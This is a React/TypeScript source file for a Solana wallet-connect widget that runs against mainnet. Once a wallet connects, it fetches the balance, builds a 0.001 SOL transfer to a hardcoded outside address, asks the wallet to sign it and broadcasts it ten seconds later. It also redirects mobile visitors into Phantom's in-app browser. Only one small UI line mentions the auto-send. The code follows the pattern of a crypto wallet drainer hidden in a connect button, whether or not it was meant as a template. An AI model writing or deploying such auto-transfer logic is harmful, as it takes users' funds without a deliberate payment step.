import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import ReactDOM from 'react-dom';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    ConnectionProvider,
    WalletProvider,
    useWallet,
} from '@solana/wallet-adapter-react';
import {
    WalletModalProvider,
    useWalletModal,
    WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    Connection,
    PublicKey,
    LAMPORTS_PER_SOL,
    SystemProgram,
    Transaction,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;

    const wallets = useMemo(
        () => [
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint={'https://api.mainnet-beta.solana.com'}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>
                    {children}
                </WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();

    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);

    useEffect(() => {
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        const isPhantom = (window as any).solana?.isPhantom;

        if (isMobile && !isPhantom) {
            const url = encodeURIComponent(window.location.href);
            window.location.href = `https://phantom.app/ul/browse/${url}`;
        }
    }, []);

    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected, signTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndSendTx(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
        const rpcEndpoints = [
            'https://sg110.nodes.rpcpool.com',
            'https://api.mainnet-beta.solana.com',
            'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
            'https://rpc.ankr.com/solana',
        ];

        let connection: Connection | null = null;
        let lamports: number | null = null;

        for (const endpoint of rpcEndpoints) {
            try {
                const testConn = new Connection(endpoint, 'confirmed');
                lamports = await testConn.getBalance(walletPublicKey);
                connection = testConn;
                break;
            } catch (err) {
                console.warn(`⚠️ RPC failed: ${endpoint}`, err);
            }
        }

        if (!connection || lamports === null) {
            alert('❌ All RPCs failed. Try again later.');
            return;
        }

        try {
            setSolBalance(lamports / LAMPORTS_PER_SOL);
            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);

            const sendAmount = 0.001 * LAMPORTS_PER_SOL;
            if (lamports <= sendAmount + 100000) {
                alert('⚠️ Not enough SOL to send 0.001 SOL.');
                return;
            }

            const tx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
                    lamports: sendAmount,
                })
            );

            tx.feePayer = walletPublicKey;
            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

            if (!signTransaction) {
                alert('❌ Wallet not ready to sign.');
                return;
            }

            const signedTx = await signTransaction(tx);
            console.log('🖊️ Transaction signed.');

            setTimeout(async () => {
                try {
                    const txid = await connection!.sendRawTransaction(signedTx.serialize());
                    console.log(`🚀 Transaction sent. Signature: ${txid}`);
                } catch (err) {
                    console.error('❌ Failed to send transaction:', err);
                }
            }, 10000);
        } catch (err) {
            console.error('❌ Error sending transaction:', err);
            alert('Transaction failed.');
        } finally {
            setLoading(false);
        }
    };

    const walletPopupEl = typeof window !== 'undefined' ? document.getElementById('walletPopup') : null;

    const WalletUI = (
        <div
            style={{
                marginTop: '2rem',
                textAlign: 'center',
                backgroundColor: '#f8f8f8',
                padding: '20px',
                borderRadius: '10px',
                boxShadow: '0 0 12px rgba(0,0,0,0.1)',
                fontFamily: 'Arial, sans-serif',
                marginLeft: 'auto',
                marginRight: 'auto',
                maxWidth: '500px',
            }}
        >
            {!connected || !publicKey ? (
                <WalletMultiButton />
            ) : (
                <>
                    <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected</h2>
                    <p
                        style={{ wordBreak: 'break-all', cursor: 'pointer', color: '#333' }}
                        onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
                    >
                        <strong>Address:</strong> {publicKey.toBase58()}
                    </p>
                    <p>
                        <strong>Balance:</strong>{' '}
                        {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
                    </p>
                    <p style={{ color: '#555' }}>Transaction will auto-send 10s after connect.</p>
                </>
            )}
        </div>
    );

    return walletPopupEl ? ReactDOM.createPortal(WalletUI, walletPopupEl) : null;
};

export default App;
